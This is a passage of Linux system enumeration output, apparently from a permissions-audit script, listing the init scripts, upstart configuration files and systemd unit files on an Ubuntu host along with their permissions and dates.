-rw-r--r--   1 root root  1649 Jan 12  2018 .depend.boot
-rw-r--r--   1 root root  1397 Jan 12  2018 .depend.start
-rw-r--r--   1 root root  1406 Jan 12  2018 .depend.stop
-rwxr-xr-x   1 root root  1172 Oct 23  2015 dns-clean
-rwxr-xr-x   1 root root  1105 Mar 15  2016 grub-common
-rwxr-xr-x   1 root root  1336 Jan 19  2016 halt
-rwxr-xr-x   1 root root  1423 Jan 19  2016 hostname.sh
-rwxr-xr-x   1 root root  3809 Mar 12  2016 hwclock.sh
-rwxr-xr-x   1 root root  2372 Apr 11  2016 irqbalance
-rwxr-xr-x   1 root root  3102 Mar 10  2016 kerneloops
-rwxr-xr-x   1 root root  1804 Apr  4  2016 keyboard-setup
-rwxr-xr-x   1 root root  1300 Jan 19  2016 killprocs
-rwxr-xr-x   1 root root  2087 Dec 20  2015 kmod
-rwxr-xr-x   1 root root  3431 Mar 31  2017 lightdm
-rwxr-xr-x   1 root root   703 Jan 19  2016 mountall-bootclean.sh
-rwxr-xr-x   1 root root  2301 Jan 19  2016 mountall.sh
-rwxr-xr-x   1 root root  1461 Jan 19  2016 mountdevsubfs.sh
-rwxr-xr-x   1 root root  1564 Jan 19  2016 mountkernfs.sh
-rwxr-xr-x   1 root root   711 Jan 19  2016 mountnfs-bootclean.sh
-rwxr-xr-x   1 root root  2456 Jan 19  2016 mountnfs.sh
-rwxr-xr-x   1 root root  5607 Feb  3  2017 mysql
-rwxr-xr-x   1 root root  4771 Jul 19  2015 networking
-rwxr-xr-x   1 root root  1757 Jan 11  2017 network-manager
-rwxr-xr-x   1 root root  1581 Oct 15  2015 ondemand
-rwxr-xr-x   1 root root  1578 Sep 17  2016 open-vm-tools
-rwxr-xr-x   1 root root  1366 Nov 15  2015 plymouth
-rwxr-xr-x   1 root root   752 Nov 15  2015 plymouth-log
-rwxr-xr-x   1 root root   612 Jan 27  2016 pppd-dns
-rwxr-xr-x   1 root root  1192 Sep  5  2015 procps
-rwxr-xr-x   1 root root  6366 Jan 19  2016 rc
-rwxr-xr-x   1 root root   820 Jan 19  2016 rc.local
-rwxr-xr-x   1 root root   117 Jan 19  2016 rcS
-rw-r--r--   1 root root  2427 Jan 19  2016 README
-rwxr-xr-x   1 root root   661 Jan 19  2016 reboot
-rwxr-xr-x   1 root root  4149 Nov 23  2015 resolvconf
-rwxr-xr-x   1 root root  4355 Jul 10  2014 rsync
-rwxr-xr-x   1 root root  2796 Feb  3  2016 rsyslog
-rwxr-xr-x   1 root root  2522 Jul  9  2015 saned
-rwxr-xr-x   1 root root  3927 Jan 19  2016 sendsigs
-rwxr-xr-x   1 root root   597 Jan 19  2016 single
-rw-r--r--   1 root root  1087 Jan 19  2016 skeleton
-rwxr-xr-x   1 root root  2117 Feb 18  2016 speech-dispatcher
-rwxr-xr-x   1 root root  4077 Mar 16  2017 ssh
-rwxr-xr-x   1 root root  1154 Jan 29  2016 thermald
-rwxr-xr-x   1 root root  6087 Apr 12  2016 udev
-rwxr-xr-x   1 root root  2049 Aug  7  2014 ufw
-rwxr-xr-x   1 root root  2737 Jan 19  2016 umountfs
-rwxr-xr-x   1 root root  2202 Jan 19  2016 umountnfs.sh
-rwxr-xr-x   1 root root  1879 Jan 19  2016 umountroot
-rwxr-xr-x   1 root root  1391 Apr 20  2017 unattended-upgrades
-rwxr-xr-x   1 root root  3111 Jan 19  2016 urandom
-rwxr-xr-x   1 root root  1306 Jun 14  2017 uuidd
-rwxr-xr-x   1 root root  2031 Feb 10  2016 vsftpd
-rwxr-xr-x   1 root root   485 Jun 15  2016 whoopsie
-rwxr-xr-x   1 root root  2757 Nov 10  2015 x11-common


[-] /etc/init/ config file permissions:
total 372
drwxr-xr-x   2 root root  4096 Jan 12  2018 .
drwxr-xr-x 134 root root 12288 Jan 18  2018 ..
-rw-r--r--   1 root root   338 Apr  8  2016 acpid.conf
-rw-r--r--   1 root root   309 Apr 14  2016 alsa-utils.conf
-rw-r--r--   1 root root   278 Dec 28  2014 anacron.conf
-rw-r--r--   1 root root  3709 Mar  3  2017 apparmor.conf
-rw-r--r--   1 root root  1629 Nov 17  2017 apport.conf
-rw-r--r--   1 root root   207 Nov 24  2015 avahi-cups-reload.conf
-rw-r--r--   1 root root   541 Nov 24  2015 avahi-daemon.conf
-rw-r--r--   1 root root   997 Mar  1  2016 bluetooth.conf
-rw-r--r--   1 root root   328 Nov 18  2014 bootmisc.sh.conf
-rw-r--r--   1 root root   232 Nov 18  2014 checkfs.sh.conf
-rw-r--r--   1 root root   253 Nov 18  2014 checkroot-bootclean.sh.conf
-rw-r--r--   1 root root   307 Nov 18  2014 checkroot.sh.conf
-rw-r--r--   1 root root   266 May 19  2016 console.conf
-rw-r--r--   1 root root   250 Apr  4  2016 console-font.conf
-rw-r--r--   1 root root   509 Apr  4  2016 console-setup.conf
-rw-r--r--   1 root root  1122 May 19  2016 container-detect.conf
-rw-r--r--   1 root root   356 May 19  2016 control-alt-delete.conf
-rw-r--r--   1 root root   297 Apr  5  2016 cron.conf
-rw-r--r--   1 root root   525 Aug 22  2016 cups-browsed.conf
-rw-r--r--   1 root root  1815 Mar 25  2016 cups.conf
-rw-r--r--   1 root root   482 Sep  1  2015 dbus.conf
-rw-r--r--   1 root root  1377 May 19  2016 failsafe.conf
-rw-r--r--   1 root root   374 Aug 19  2016 failsafe-x.conf
-rw-r--r--   1 root root   267 May 19  2016 flush-early-job-log.conf
-rw-r--r--   1 root root  1247 Jun  1  2015 friendly-recovery.conf
-rw-r--r--   1 root root   186 Aug 25  2016 gpu-manager.conf
-rw-r--r--   1 root root   284 Jul 23  2013 hostname.conf
-rw-r--r--   1 root root   300 May 21  2014 hostname.sh.conf
-rw-r--r--   1 root root   674 Mar 14  2016 hwclock.conf
-rw-r--r--   1 root root   561 Mar 14  2016 hwclock-save.conf
-rw-r--r--   1 root root   109 Mar 14  2016 hwclock.sh.conf
-rw-r--r--   1 root root   597 Apr 11  2016 irqbalance.conf
-rw-r--r--   1 root root   689 Aug 20  2015 kmod.conf
-rw-r--r--   1 root root  1444 Mar 31  2017 lightdm.conf
-rw-r--r--   1 root root   268 Nov 18  2014 mountall-bootclean.sh.conf
-rw-r--r--   1 root root  1232 Nov 18  2014 mountall.conf
-rw-r--r--   1 root root   349 Nov 18  2014 mountall-net.conf
-rw-r--r--   1 root root   261 Nov 18  2014 mountall-reboot.conf
-rw-r--r--   1 root root   311 Nov 18  2014 mountall.sh.conf
-rw-r--r--   1 root root  1201 Nov 18  2014 mountall-shell.conf
-rw-r--r--   1 root root   327 Nov 18  2014 mountdevsubfs.sh.conf
-rw-r--r--   1 root root   405 Nov 18  2014 mounted-debugfs.conf
-rw-r--r--   1 root root   730 Nov 18  2014 mounted-dev.conf
-rw-r--r--   1 root root   536 Nov 18  2014 mounted-proc.conf
-rw-r--r--   1 root root   618 Nov 18  2014 mounted-run.conf
-rw-r--r--   1 root root  1890 Nov 18  2014 mounted-tmp.conf
-rw-r--r--   1 root root   903 Nov 18  2014 mounted-var.conf
-rw-r--r--   1 root root   323 Nov 18  2014 mountkernfs.sh.conf
-rw-r--r--   1 root root   249 Nov 18  2014 mountnfs-bootclean.sh.conf
-rw-r--r--   1 root root   313 Nov 18  2014 mountnfs.sh.conf
-rw-r--r--   1 root root   238 Nov 18  2014 mtab.sh.conf
-rw-r--r--   1 root root  1757 Feb  3  2017 mysql.conf
-rw-r--r--   1 root root  2493 Jun  2  2015 networking.conf
-rw-r--r--   1 root root   933 Jun  2  2015 network-interface.conf
-rw-r--r--   1 root root   530 Jun  2  2015 network-interface-container.conf
-rw-r--r--   1 root root  1756 Jun  2  2015 network-interface-security.conf
-rw-r--r--   1 root root   568 Jan 11  2017 network-manager.conf
-rw-r--r--   1 root root   568 Feb  1  2016 passwd.conf
-rw-r--r--   1 root root   119 Jun  5  2014 procps.conf
-rw-r--r--   1 root root   363 Jun  5  2014 procps-instance.conf
-rw-r--r--   1 root root   661 May 19  2016 rc.conf
-rw-r--r--   1 root root   683 May 19  2016 rcS.conf
-rw-r--r--   1 root root  1543 May 19  2016 rc-sysinit.conf
-rw-r--r--   1 root root   457 Jun  3  2015 resolvconf.conf
-rw-r--r--   1 root root   365 Nov  2  2014 rfkill-restore.conf
-rw-r--r--   1 root root   357 Nov  2  2014 rfkill-store.conf
-rw-r--r--   1 root root   426 Dec  2  2015 rsyslog.conf
-rw-r--r--   1 root root   230 Apr  4  2016 setvtrgb.conf
-rw-r--r--   1 root root   277 May 19  2016 shutdown.conf
-rw-r--r--   1 root root   641 Mar 16  2017 ssh.conf
-rw-r--r--   1 root root   360 Apr 18  2017 thermald.conf
-rw-r--r--   1 root root   348 May 19  2016 tty1.conf
-rw-r--r--   1 root root   333 May 19  2016 tty2.conf
-rw-r--r--   1 root root   333 May 19  2016 tty3.conf
-rw-r--r--   1 root root   333 May 19  2016 tty4.conf
-rw-r--r--   1 root root   232 May 19  2016 tty5.conf
-rw-r--r--   1 root root   232 May 19  2016 tty6.conf
-rw-r--r--   1 root root   337 Apr 12  2016 udev.conf
-rw-r--r--   1 root root   360 Apr 12  2016 udevmonitor.conf
-rw-r--r--   1 root root   352 Apr 12  2016 udevtrigger.conf
-rw-r--r--   1 root root   473 Aug  7  2014 ufw.conf
-rw-r--r--   1 root root   412 May 19  2016 upstart-file-bridge.conf
-rw-r--r--   1 root root   329 May 19  2016 upstart-socket-bridge.conf
-rw-r--r--   1 root root   553 May 19  2016 upstart-udev-bridge.conf
-rw-r--r--   1 root root   889 Feb 24  2015 ureadahead.conf
-rw-r--r--   1 root root   683 Feb 24  2015 ureadahead-other.conf
-rw-r--r--   1 root root   141 Oct  5  2015 usb-modeswitch-upstart.conf
-rw-r--r--   1 root root  1521 May 19  2016 wait-for-state.conf
-rw-r--r--   1 root root   453 Jul 27  2017 whoopsie.conf


[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 8.3M
drwxr-xr-x 30 root root  36K Jan 12  2018 system
drwxr-xr-x  2 root root 4.0K Jan 12  2018 network
drwxr-xr-x  2 root root 4.0K Jan 12  2018 system-generators
drwxr-xr-x  2 root root 4.0K Jan 12  2018 system-preset
drwxr-xr-x  2 root root 4.0K Dec 19  2017 system-sleep
-rwxr-xr-x  1 root root 443K Oct 27  2017 systemd-udevd
-rwxr-xr-x  1 root root  55K Oct 27  2017 systemd-activate
-rwxr-xr-x  1 root root 103K Oct 27  2017 systemd-bootchart
-rwxr-xr-x  1 root root 268K Oct 27  2017 systemd-cgroups-agent
-rwxr-xr-x  1 root root 276K Oct 27  2017 systemd-initctl
-rwxr-xr-x  1 root root 340K Oct 27  2017 systemd-localed
-rwxr-xr-x  1 root root 123K Oct 27  2017 systemd-networkd-wait-online
-rwxr-xr-x  1 root root  35K Oct 27  2017 systemd-quotacheck
-rwxr-xr-x  1 root root 653K Oct 27  2017 systemd-resolved
-rwxr-xr-x  1 root root  91K Oct 27  2017 systemd-rfkill
-rwxr-xr-x  1 root root 143K Oct 27  2017 systemd-shutdown
-rwxr-xr-x  1 root root  91K Oct 27  2017 systemd-socket-proxyd
-rwxr-xr-x  1 root root  51K Oct 27  2017 systemd-sysctl
-rwxr-xr-x  1 root root  35K Oct 27  2017 systemd-user-sessions
-rwxr-xr-x  1 root root  91K Oct 27  2017 systemd-backlight
-rwxr-xr-x  1 root root  47K Oct 27  2017 systemd-binfmt
-rwxr-xr-x  1 root root 301K Oct 27  2017 systemd-fsck
-rwxr-xr-x  1 root root  75K Oct 27  2017 systemd-fsckd
-rwxr-xr-x  1 root root 605K Oct 27  2017 systemd-logind
-rwxr-xr-x  1 root root  51K Oct 27  2017 systemd-modules-load
-rwxr-xr-x  1 root root  35K Oct 27  2017 systemd-random-seed
-rwxr-xr-x  1 root root  51K Oct 27  2017 systemd-remount-fs
-rwxr-xr-x  1 root root  31K Oct 27  2017 systemd-reply-password
-rwxr-xr-x  1 root root  71K Oct 27  2017 systemd-sleep
-rwxr-xr-x  1 root root 333K Oct 27  2017 systemd-timedated
-rwxr-xr-x  1 root root 139K Oct 27  2017 systemd-timesyncd
-rwxr-xr-x  1 root root 276K Oct 27  2017 systemd-update-utmp
-rwxr-xr-x  1 root root 1.6M Oct 27  2017 systemd
-rwxr-xr-x  1 root root  15K Oct 27  2017 systemd-ac-power
-rwxr-xr-x  1 root root 352K Oct 27  2017 systemd-bus-proxyd
-rwxr-xr-x  1 root root  91K Oct 27  2017 systemd-cryptsetup
-rwxr-xr-x  1 root root  31K Oct 27  2017 systemd-hibernate-resume
-rwxr-xr-x  1 root root 332K Oct 27  2017 systemd-hostnamed
-rwxr-xr-x  1 root root 319K Oct 27  2017 systemd-journald
-rwxr-xr-x  1 root root 828K Oct 27  2017 systemd-networkd
-rwxr-xr-x  1 root root 1.3K Oct 26  2017 systemd-sysv-install
drwxr-xr-x  2 root root 4.0K Apr 12  2016 system-shutdown

/lib/systemd/system:
total 1.1M
drwxr-xr-x 2 root root 4.0K Jan 12  2018 halt.target.wants
drwxr-xr-x 2 root root 4.0K Jan 12  2018 initrd-switch-root.target.wants
drwxr-xr-x 2 root root 4.0K Jan 12  2018 kexec.target.wants
drwxr-xr-x 2 root root 4.0K Jan 12  2018 multi-user.target.wants
drwxr-xr-x 2 root root 4.0K Jan 12  2018 poweroff.target.wants
drwxr-xr-x 2 root root 4.0K Jan 12  2018 reboot.target.wants
drwxr-xr-x 2 root root 4.0K Jan 12  2018 sysinit.target.wants
drwxr-xr-x 2 root root 4.0K Jan 12  2018 sockets.target.wants
drwxr-xr-x 2 root root 4.0K Jan 12  2018 getty.target.wants
drwxr-xr-x 2 root root 4.0K Jan 12  2018 graphical.target.wants
drwxr-xr-x 2 root root 4.0K Jan 12  2018 local-fs.target.wants
drwxr-xr-x 2 root root 4.0K Jan 12  2018 rescue.target.wants
drwxr-xr-x 2 root root 4.0K Jan 12  2018 resolvconf.service.wants
drwxr-xr-x 2 root root 4.0K Jan 12  2018 sigpwr.target.wants
drwxr-xr-x 2 root root 4.0K Jan 12  2018 timers.target.wants
drwxr-xr-x 2 root root 4.0K Jan 12  2018 rc-local.service.d
drwxr-xr-x 2 root root 4.0K Jan 12  2018 systemd-resolved.service.d
drwxr-xr-x 2 root root 4.0K Jan 12  2018 systemd-timesyncd.service.d
-rw-r--r-- 1 root root  246 Jan  2  2018 apport-forward.socket
drwxr-xr-x 2 root root 4.0K Dec 18  2017 apache2.service.d
lrwxrwxrwx 1 root root    9 Dec 18  2017 saned.service -> /dev/null
lrwxrwxrwx 1 root root    9 Dec 18  2017 alsa-utils.service -> /dev/null
-rw-r--r-- 1 root root  252 Nov 30  2017 snapd.autoimport.service
-rw-r--r-- 1 root root  386 Nov 30  2017 snapd.core-fixup.service
-rw-r--r-- 1 root root  290 Nov 30  2017 snapd.refresh.service
-rw-r--r-- 1 root root  323 Nov 30  2017 snapd.refresh.timer
-rw-r--r-- 1 root root  308 Nov 30  2017 snapd.service
-rw-r--r-- 1 root root  253 Nov 30  2017 snapd.snap-repair.service
-rw-r--r-- 1 root root  281 Nov 30  2017 snapd.snap-repair.timer
-rw-r--r-- 1 root root  281 Nov 30  2017 snapd.socket
-rw-r--r-- 1 root root  474 Nov 30  2017 snapd.system-shutdown.service
lrwxrwxrwx 1 root root   22 Nov 16  2017 network-manager.service -> NetworkManager.service
-rw-r--r-- 1 root root  364 Nov 16  2017 NetworkManager-dispatcher.service
-rw-r--r-- 1 root root  857 Nov 16  2017 NetworkManager.service
-rw-r--r-- 1 root root  303 Nov 16  2017 NetworkManager-wait-online.service
lrwxrwxrwx 1 root root   21 Oct 27  2017 udev.service -> systemd-udevd.service
lrwxrwxrwx 1 root root   14 Oct 27  2017 autovt@.service -> getty@.service
lrwxrwxrwx 1 root root    9 Oct 27  2017 bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 bootlogs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 bootmisc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 checkfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 checkroot-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 checkroot.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 cryptdisks-early.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 cryptdisks.service -> /dev/null
lrwxrwxrwx 1 root root   13 Oct 27  2017 ctrl-alt-del.target -> reboot.target
lrwxrwxrwx 1 root root   25 Oct 27  2017 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
lrwxrwxrwx 1 root root   23 Oct 27  2017 dbus-org.freedesktop.locale1.service -> systemd-localed.service
lrwxrwxrwx 1 root root   22 Oct 27  2017 dbus-org.freedesktop.login1.service -> systemd-logind.service
lrwxrwxrwx 1 root root   24 Oct 27  2017 dbus-org.freedesktop.network1.service -> systemd-networkd.service
lrwxrwxrwx 1 root root   24 Oct 27  2017 dbus-org.freedesktop.resolve1.service -> systemd-resolved.service
lrwxrwxrwx 1 root root   25 Oct 27  2017 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
lrwxrwxrwx 1 root root   16 Oct 27  2017 default.target -> graphical.target
lrwxrwxrwx 1 root root    9 Oct 27  2017 fuse.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 halt.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 hostname.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 hwclock.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 killprocs.service -> /dev/null
lrwxrwxrwx 1 root root   28 Oct 27  2017 kmod.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root   28 Oct 27  2017 module-init-tools.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root    9 Oct 27  2017 motd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 mountall-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 mountall.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 mountdevsubfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 mountkernfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 mountnfs-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 mountnfs.service -> /dev/null
lrwxrwxrwx 1 root root   22 Oct 27  2017 procps.service -> systemd-sysctl.service
lrwxrwxrwx 1 root root   16 Oct 27  2017 rc.local.service -> rc-local.service
lrwxrwxrwx 1 root root    9 Oct 27  2017 rc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 rcS.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 reboot.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 rmnologin.service -> /dev/null
lrwxrwxrwx 1 root root   15 Oct 27  2017 runlevel0.target -> poweroff.target
lrwxrwxrwx 1 root root   13 Oct 27  2017 runlevel1.target -> rescue.target
lrwxrwxrwx 1 root root   17 Oct 27  2017 runlevel2.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Oct 27  2017 runlevel3.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Oct 27  2017 runlevel4.target -> multi-user.target
lrwxrwxrwx 1 root root   16 Oct 27  2017 runlevel5.target -> graphical.target
lrwxrwxrwx 1 root root   13 Oct 27  2017 runlevel6.target -> reboot.target
lrwxrwxrwx 1 root root    9 Oct 27  2017 sendsigs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 single.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 stop-bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 stop-bootlogd-single.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 umountfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 umountnfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 umountroot.service -> /dev/null
lrwxrwxrwx 1 root root   27 Oct 27  2017 urandom.service -> systemd-random-seed.service
lrwxrwxrwx 1 root root    9 Oct 27  2017 x11-common.service -> /dev/null
-rw-r--r-- 1 root root  770 Oct 27  2017 console-getty.service
-rw-r--r-- 1 root root  742 Oct 27  2017 console-shell.service
-rw-r--r-- 1 root root  791 Oct 27  2017 container-getty@.service
-rw-r--r-- 1 root root 1010 Oct 27  2017 debug-shell.service
-rw-r--r-- 1 root root 1009 Oct 27  2017 emergency.service
-rw-r--r-- 1 root root 1.5K Oct 27  2017 getty@.service
-rw-r--r-- 1 root root  630 Oct 27  2017 initrd-cleanup.service
-rw-r--r-- 1 root root  790 Oct 27  2017 initrd-parse-etc.service
-rw-r--r-- 1 root root  640 Oct 27  2017 initrd-switch-root.service
-rw-r--r-- 1 root root  664 Oct 27  2017 initrd-udevadm-cleanup-db.service
-rw-r--r-- 1 root root  677 Oct 27  2017 kmod-static-nodes.service
-rw-r--r-- 1 root root  473 Oct 27  2017 mail-transport-agent.target
-rw-r--r-- 1 root root  568 Oct 27  2017 quotaon.service
-rw-r--r-- 1 root root  612 Oct 27  2017 rc-local.service
-rw-r--r-- 1 root root  978 Oct 27  2017 rescue.service
-rw-r--r-- 1 root root 1.1K Oct 27  2017 serial-getty@.service
-rw-r--r-- 1 root root  653 Oct 27  2017 systemd-ask-password-console.service
-rw-r--r-- 1 root root  681 Oct 27  2017 systemd-ask-password-wall.service
-rw-r--r-- 1 root root  724 Oct 27  2017 systemd-backlight@.service
-rw-r--r-- 1 root root  959 Oct 27  2017 systemd-binfmt.service
-rw-r--r-- 1 root root  650 Oct 27  2017 systemd-bootchart.service
-rw-r--r-- 1 root root 1.0K Oct 27  2017 systemd-bus-proxyd.service
-rw-r--r-- 1 root root  497 Oct 27  2017 systemd-exit.service
-rw-r--r-- 1 root root  551 Oct 27  2017 systemd-fsckd.service
-rw-r--r-- 1 root root  674 Oct 27  2017 systemd-fsck-root.service
-rw-r--r-- 1 root root  648 Oct 27  2017 systemd-fsck@.service
-rw-r--r-- 1 root root  544 Oct 27  2017 systemd-halt.service
-rw-r--r-- 1 root root  631 Oct 27  2017 systemd-hibernate-resume@.service
-rw-r--r-- 1 root root  501 Oct 27  2017 systemd-hibernate.service
-rw-r--r-- 1 root root  710 Oct 27  2017 systemd-hostnamed.service
-rw-r--r-- 1 root root  778 Oct 27  2017 systemd-hwdb-update.service
-rw-r--r-- 1 root root  519 Oct 27  2017 systemd-hybrid-sleep.service
-rw-r--r-- 1 root root  480 Oct 27  2017 systemd-initctl.service
-rw-r--r-- 1 root root 1.3K Oct 27  2017 systemd-journald.service
-rw-r--r-- 1 root root  731 Oct 27  2017 systemd-journal-flush.service
-rw-r--r-- 1 root root  557 Oct 27  2017 systemd-kexec.service
-rw-r--r-- 1 root root  691 Oct 27  2017 systemd-localed.service
-rw-r--r-- 1 root root 1.2K Oct 27  2017 systemd-logind.service
-rw-r--r-- 1 root root  693 Oct 27  2017 systemd-machine-id-commit.service
-rw-r--r-- 1 root root  967 Oct 27  2017 systemd-modules-load.service
-rw-r--r-- 1 root root 1.3K Oct 27  2017 systemd-networkd.service
-rw-r--r-- 1 root root  685 Oct 27  2017 systemd-networkd-wait-online.service
-rw-r--r-- 1 root root  553 Oct 27  2017 systemd-poweroff.service
-rw-r--r-- 1 root root  614 Oct 27  2017 systemd-quotacheck.service
-rw-r--r-- 1 root root  717 Oct 27  2017 systemd-random-seed.service
-rw-r--r-- 1 root root  548 Oct 27  2017 systemd-reboot.service
-rw-r--r-- 1 root root  757 Oct 27  2017 systemd-remount-fs.service
-rw-r--r-- 1 root root  907 Oct 27  2017 systemd-resolved.service
-rw-r--r-- 1 root root  696 Oct 27  2017 systemd-rfkill.service
-rw-r--r-- 1 root root  497 Oct 27  2017 systemd-suspend.service
-rw-r--r-- 1 root root  649 Oct 27  2017 systemd-sysctl.service
-rw-r--r-- 1 root root  655 Oct 27  2017 systemd-timedated.service
-rw-r--r-- 1 root root 1.1K Oct 27  2017 systemd-timesyncd.service
-rw-r--r-- 1 root root  598 Oct 27  2017 systemd-tmpfiles-clean.service
-rw-r--r-- 1 root root  703 Oct 27  2017 systemd-tmpfiles-setup-dev.service
-rw-r--r-- 1 root root  683 Oct 27  2017 systemd-tmpfiles-setup.service
-rw-r--r-- 1 root root  825 Oct 27  2017 systemd-udevd.service
-rw-r--r-- 1 root root  823 Oct 27  2017 systemd-udev-settle.service
-rw-r--r-- 1 root root  743 Oct 27  2017 systemd-udev-trigger.service
-rw-r--r-- 1 root root  757 Oct 27  2017 systemd-update-utmp-runlevel.service
-rw-r--r-- 1 root root  754 Oct 27  2017 systemd-update-utmp.service
-rw-r--r-- 1 root root  573 Oct 27  2017 systemd-user-sessions.service
-rw-r--r-- 1 root root  528 Oct 27  2017 user@.service
-rw-r--r-- 1 root root  879 Oct 27  2017 basic.target
-rw-r--r-- 1 root root  379 Oct 27  2017 bluetooth.target
-rw-r--r-- 1 root root  358 Oct 27  2017 busnames.target
-rw-r--r-- 1 root root  394 Oct 27  2017 cryptsetup-pre.target
-rw-r--r-- 1 root root  366 Oct 27  2017 cryptsetup.target
-rw-r--r-- 1 root root  670 Oct 27  2017 dev-hugepages.mount
-rw-r--r-- 1 root root  624 Oct 27  2017 dev-mqueue.mount
-rw-r--r-- 1 root root  431 Oct 27  2017 emergency.target
-rw-r--r-- 1 root root  501 Oct 27  2017 exit.target
-rw-r--r-- 1 root root  440 Oct 27  2017 final.target
-rw-r--r-- 1 root root  460 Oct 27  2017 getty.target
-rw-r--r-- 1 root root  558 Oct 27  2017 graphical.target
-rw-r--r-- 1 root root  487 Oct 27  2017 halt.target
-rw-r--r-- 1 root root  447 Oct 27  2017 hibernate.target
-rw-r--r-- 1 root root  468 Oct 27  2017 hybrid-sleep.target
-rw-r--r-- 1 root root  553 Oct 27  2017 initrd-fs.target
-rw-r--r-- 1 root root  526 Oct 27  2017 initrd-root-fs.target
-rw-r--r-- 1 root root  691 Oct 27  2017 initrd-switch-root.target
-rw-r--r-- 1 root root  671 Oct 27  2017 initrd.target
-rw-r--r-- 1 root root  501 Oct 27  2017 kexec.target
-rw-r--r-- 1 root root  395 Oct 27  2017 local-fs-pre.target
-rw-r--r-- 1 root root  507 Oct 27  2017 local-fs.target
-rw-r--r-- 1 root root  405 Oct 27  2017 machine.slice
-rw-r--r-- 1 root root  492 Oct 27  2017 multi-user.target
-rw-r--r-- 1 root root  464 Oct 27  2017 network-online.target
-rw-r--r-- 1 root root  461 Oct 27  2017 network-pre.target
-rw-r--r-- 1 root root  480 Oct 27  2017 network.target
-rw-r--r-- 1 root root  514 Oct 27  2017 nss-lookup.target
-rw-r--r-- 1 root root  473 Oct 27  2017 nss-user-lookup.target
-rw-r--r-- 1 root root  354 Oct 27  2017 paths.target
-rw-r--r-- 1 root root  552 Oct 27  2017 poweroff.target
-rw-r--r-- 1 root root  377 Oct 27  2017 printer.target
-rw-r--r-- 1 root root  693 Oct 27  2017 proc-sys-fs-binfmt_misc.automount
-rw-r--r-- 1 root root  603 Oct 27  2017 proc-sys-fs-binfmt_misc.mount
-rw-r--r-- 1 root root  543 Oct 27  2017 reboot.target
-rw-r--r-- 1 root root  396 Oct 27  2017 remote-fs-pre.target
-rw-r--r-- 1 root root  482 Oct 27  2017 remote-fs.target
-rw-r--r-- 1 root root  486 Oct 27  2017 rescue.target
-rw-r--r-- 1 root root  500 Oct 27  2017 rpcbind.target
-rw-r--r-- 1 root root  402 Oct 27  2017 shutdown.target
-rw-r--r-- 1 root root  362 Oct 27  2017 sigpwr.target
-rw-r--r-- 1 root root  420 Oct 27  2017 sleep.target
-rw-r--r-- 1 root root  403 Oct 27  2017 -.slice
-rw-r--r-- 1 root root  409 Oct 27  2017 slices.target
-rw-r--r-- 1 root root  380 Oct 27  2017 smartcard.target
-rw-r--r-- 1 root root  356 Oct 27  2017 sockets.target
-rw-r--r-- 1 root root  380 Oct 27  2017 sound.target
-rw-r--r-- 1 root root  441 Oct 27  2017 suspend.target
-rw-r--r-- 1 root root  353 Oct 27  2017 swap.target
-rw-r--r-- 1 root root  715 Oct 27  2017 sys-fs-fuse-connections.mount
-rw-r--r-- 1 root root  518 Oct 27  2017 sysinit.target
-rw-r--r-- 1 root root  719 Oct 27  2017 sys-kernel-config.mount
-rw-r--r-- 1 root root  662 Oct 27  2017 sys-kernel-debug.mount
-rw-r--r-- 1 root root 1.3K Oct 27  2017 syslog.socket
-rw-r--r-- 1 root root  646 Oct 27  2017 systemd-ask-password-console.path
-rw-r--r-- 1 root root  574 Oct 27  2017 systemd-ask-password-wall.path
-rw-r--r-- 1 root root  409 Oct 27  2017 systemd-bus-proxyd.socket
-rw-r--r-- 1 root root  540 Oct 27  2017 systemd-fsckd.socket
-rw-r--r-- 1 root root  524 Oct 27  2017 systemd-initctl.socket
-rw-r--r-- 1 root root  607 Oct 27  2017 systemd-journald-audit.socket
-rw-r--r-- 1 root root 1.1K Oct 27  2017 systemd-journald-dev-log.socket
-rw-r--r-- 1 root root  842 Oct 27  2017 systemd-journald.socket
-rw-r--r-- 1 root root  591 Oct 27  2017 systemd-networkd.socket
-rw-r--r-- 1 root root  617 Oct 27  2017 systemd-rfkill.socket
-rw-r--r-- 1 root root  450 Oct 27  2017 systemd-tmpfiles-clean.timer
-rw-r--r-- 1 root root  578 Oct 27  2017 systemd-udevd-control.socket
-rw-r--r-- 1 root root  570 Oct 27  2017 systemd-udevd-kernel.socket
-rw-r--r-- 1 root root  436 Oct 27  2017 system.slice
-rw-r--r-- 1 root root  585 Oct 27  2017 system-update.target
